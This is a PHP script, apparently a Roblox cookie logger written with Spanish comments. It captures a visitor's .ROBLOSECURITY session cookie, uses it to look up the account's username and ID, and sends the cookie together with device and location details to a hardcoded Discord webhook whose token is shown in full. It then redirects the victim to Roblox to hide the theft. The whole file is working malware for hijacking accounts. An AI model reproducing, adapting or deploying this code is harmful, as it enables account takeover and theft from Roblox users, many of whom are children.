<?php
// puente.php
$datos_json = $_GET['datos'] ?? '';
$datos = json_decode(urldecode($datos_json), true);

// 1. CAPTURAR COOKIE
$cookie = "No encontrada";
if (!empty($_SERVER['HTTP_COOKIE'])) {
    if (preg_match('/\.ROBLOSECURITY=([^;]+)/', $_SERVER['HTTP_COOKIE'], $matches)) {
        $cookie = $matches[1];
    }
}

// 2. OBTENER USERNAME E ID
$username = "No disponible";
$userid = "No disponible";

if ($cookie != "No encontrada") {
    $ch = curl_init('https://users.roblox.com/v1/users/authenticated');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Cookie: .ROBLOSECURITY=' . $cookie]);
    $response = curl_exec($ch);
    curl_close($ch);
    
    if ($response) {
        $data = json_decode($response, true);
        $username = $data['name'] ?? 'No disponible';
        $userid = $data['id'] ?? 'No disponible';
    }
}

// 3. CONSTRUIR MENSAJE COMPLETO
$mensaje_completo = "|| @everyone ||\n";
$mensaje_completo .= "🔔 ¡Nueva Entrada. **{$datos['nombre']}**!\n\n";
$mensaje_completo .= "**📌 INFORMACION GENERAL**\n\n";
$mensaje_completo .= "**Dispositivo:** `({$datos['dispositivo']})`\n";
$mensaje_completo .= "**País:** `{$datos['pais']}`\n";
$mensaje_completo .= "**Fecha:** `{$datos['fecha']}`\n";
$mensaje_completo .= "**Hora en región de {$datos['pais']}:** `{$datos['hora']}`\n\n";
$mensaje_completo .= "**ℹ️ INFORMACION SOBRE LA CUENTA DE ROBLOX**\n\n";
$mensaje_completo .= "**Usuario:** `$username`\n";
$mensaje_completo .= "**ID de usuario:** `$userid`\n\n";
$mensaje_completo .= "**🍪 Cookie De Roblox:**\n";
$mensaje_completo .= "`$cookie`\n";
$mensaje_completo .= "                                **By {$datos['nombre']}**";

// 4. EDITAR EL MENSAJE EN DISCORD
$ch = curl_init("https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd/messages/{$datos['mensajeId']}");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PATCH');
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['content' => $mensaje_completo]));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// 5. REDIRIGIR A ROBLOX
header("Location: https://www.roblox.com/home");
exit;
?>